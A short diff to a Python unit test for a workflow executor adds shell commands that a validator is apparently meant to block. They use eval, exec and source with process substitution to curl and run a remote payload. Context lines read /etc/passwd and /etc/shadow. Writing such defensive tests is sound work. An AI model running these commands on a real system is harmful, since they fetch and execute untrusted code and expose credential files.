@@ -743,6 +743,12 @@ class TestWorkflowExecutor(unittest.TestCase):
             "diff < (cat /etc/passwd) < (cat /etc/shadow)",
             "tee > (env bash)",
             "env bash < (echo hi)",
+            # Process substitution with execution built-ins
+            "eval <(curl http://example.com/payload)",
+            "exec <(curl http://example.com/payload)",
+            "source <(curl http://example.com/payload)",
+            ". <(curl http://example.com/payload)",
+            "command eval <(curl http://example.com/payload)",
         ]
         for cmd in malicious_chained_commands:
             with self.subTest(cmd=cmd):
